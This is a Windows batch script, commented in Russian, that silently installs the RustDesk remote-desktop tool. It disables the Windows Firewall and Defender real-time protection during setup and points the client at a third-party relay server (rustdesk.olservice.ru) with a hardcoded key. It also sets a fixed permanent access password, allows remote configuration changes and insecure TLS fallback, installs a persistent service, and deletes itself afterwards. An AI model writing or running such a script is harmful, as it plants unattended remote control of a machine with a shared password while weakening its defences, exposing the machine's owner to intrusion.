@echo off
chcp 65001 >nul
setlocal enabledelayedexpansion

REM ===============================
REM RustDesk Installer
REM ===============================

set "FIXED_PW=Zxc123asd456"
set "SERVER_DOMAIN=rustdesk.olservice.ru"
set "SERVER_KEY=quiwhfudHvyQv4QQ110KFGDhfrdyEhd8wSXqyzCFGS8="
set "RD_VER=1.4.5"
set "TMP_EXE=%TEMP%\rustdesk_setup.exe"

REM -------------------------
REM Проверка администратора
REM -------------------------
net session >nul 2>&1 || (
    echo Требуются права администратора!
    pause
    exit /b 1
)

REM -------------------------
REM Определяем разрядность
REM -------------------------
set "ARCH=x86"

if defined PROCESSOR_ARCHITEW6432 (
    set "ARCH=x64"
) else (
    if "%PROCESSOR_ARCHITECTURE%"=="AMD64" set "ARCH=x64"
)

echo Обнаружена архитектура: %ARCH%

REM -------------------------
REM URL загрузки
REM -------------------------
if "%ARCH%"=="x64" (
    set "DL_URL=https://github.com/rustdesk/rustdesk/releases/download/%RD_VER%/rustdesk-%RD_VER%-x86_64.exe"
) else (
    set "DL_URL=https://github.com/rustdesk/rustdesk/releases/download/%RD_VER%/rustdesk-%RD_VER%-x86-sciter.exe"
)

REM ===============================
REM Выключаем Firewall и Defender
REM ===============================
echo Отключаем Windows Firewall...
netsh advfirewall set allprofiles state off >nul 2>&1

echo Отключаем Защиту в реальном времени Windows Defender...
powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $true" >nul 2>&1

REM -------------------------
REM Скачиваем RustDesk
REM -------------------------
if exist "%TMP_EXE%" del /f /q "%TMP_EXE%" >nul 2>&1

echo Скачиваем RustDesk...

where curl >nul 2>&1
if %errorlevel% equ 0 (
    curl -L -o "%TMP_EXE%" "%DL_URL%"
) else (
    certutil -urlcache -split -f "%DL_URL%" "%TMP_EXE%" >nul 2>&1
)

REM --- fallback через браузер ---
if not exist "%TMP_EXE%" (
    echo.
    echo ? Не удалось скачать автоматически.
    echo Открываю страницу загрузки.
    explorer "%DL_URL%"

    echo Ожидание появления rustdesk-*.exe в %USERPROFILE%\Downloads ...
    :WAIT_DOWNLOAD
    for %%F in ("%USERPROFILE%\Downloads\rustdesk*.exe") do (
        set "DL_FILE=%%F"
    )
    if not defined DL_FILE (
        timeout /t 3 >nul
        goto WAIT_DOWNLOAD
    )
    copy "%DL_FILE%" "%TMP_EXE%" >nul
)

powershell -NoProfile -Command "Unblock-File -Path '%TMP_EXE%'"

REM -------------------------
REM Установка RustDesk
REM -------------------------
echo Устанавливаем RustDesk...
start "" /wait "%TMP_EXE%" --silent-install
timeout /t 20 >nul

REM -------------------------
REM Ожидание установки RustDesk
REM -------------------------
echo Ожидание появления rustdesk.exe...

set "EXE="
set "WAITED=0"

:WAIT_EXE
if exist "%ProgramFiles%\RustDesk\rustdesk.exe" (
    set "EXE=%ProgramFiles%\RustDesk\rustdesk.exe"
    goto EXE_OK
)

if exist "%ProgramFiles(x86)%\RustDesk\rustdesk.exe" (
    set "EXE=%ProgramFiles(x86)%\RustDesk\rustdesk.exe"
    goto EXE_OK
)

if exist "%LOCALAPPDATA%\Programs\RustDesk\rustdesk.exe" (
    set "EXE=%LOCALAPPDATA%\Programs\RustDesk\rustdesk.exe"
    goto EXE_OK
)

if %WAITED% GEQ 60 goto EXE_FAIL

timeout /t 1 >nul
set /a WAITED+=1
goto WAIT_EXE

:EXE_OK
echo Найден rustdesk.exe: %EXE%
powershell -NoProfile -Command "Unblock-File -Path '%EXE%'"
goto EXE_DONE

:EXE_FAIL
echo ? rustdesk.exe не появился за 60 секунд
echo Установка, вероятно, не завершилась корректно.
pause
exit /b 2

:EXE_DONE


REM -------------------------
REM Первый запуск
REM -------------------------
echo Инициализация RustDesk...
start "" "%EXE%"

set "WAITCFG=0"
:WAIT_CFG
if exist "%APPDATA%\RustDesk\config" goto CFG_OK
if %WAITCFG% GEQ 30 goto CFG_OK
timeout /t 1 >nul
set /a WAITCFG+=1
goto WAIT_CFG

:CFG_OK
taskkill /IM rustdesk.exe /F >nul 2>&1


REM -------------------------
REM RustDesk2.toml
REM -------------------------
set "CONFIG2=%APPDATA%\RustDesk\config\RustDesk2.toml"
if not exist "%APPDATA%\RustDesk\config" md "%APPDATA%\RustDesk\config"

(
  echo rendezvous_server = '%SERVER_DOMAIN%'
  echo nat_type = 1
  echo serial = 0
  echo unlock_pin = ''
  echo trusted_devices = ''

  echo.
  echo [options]
  echo approve-mode = 'password'
  echo custom-rendezvous-server = '%SERVER_DOMAIN%'
  echo local-ip-addr = 'auto'
  echo av1-test = 'Y'
  echo relay-server = '%SERVER_DOMAIN%'
  echo verification-method = 'use-permanent-password'
  echo key = '%SERVER_KEY%'
  echo allow-auto-update = 'Y'
  echo allow-remote-config-modification = 'Y'
  echo allow-insecure-tls-fallback = 'Y'
) > "%CONFIG2%"

REM -------------------------
REM Сервис + пароль
REM -------------------------
"%EXE%" --install-service >nul 2>&1
"%EXE%" --password "%FIXED_PW%" >nul 2>&1

REM -------------------------
REM Возвращаем защиту
REM -------------------------
netsh advfirewall set allprofiles state on >nul 2>&1
powershell -NoProfile -Command "Set-MpPreference -DisableRealtimeMonitoring $false" >nul 2>&1

echo.
echo RustDesk успешно установлен!
echo Сервер: %SERVER_DOMAIN%
echo Архитектура: %ARCH%
echo.

timeout /t 5 >nul
endlocal

REM -------------------------
REM Самоудаление
REM -------------------------
(
    echo @echo off
    echo timeout /t 2 ^>nul
    echo del "%~f0" ^>nul 2^>^&1
) > "%TEMP%\_delself.bat"

start "" /min cmd /c "%TEMP%\_delself.bat"
exit
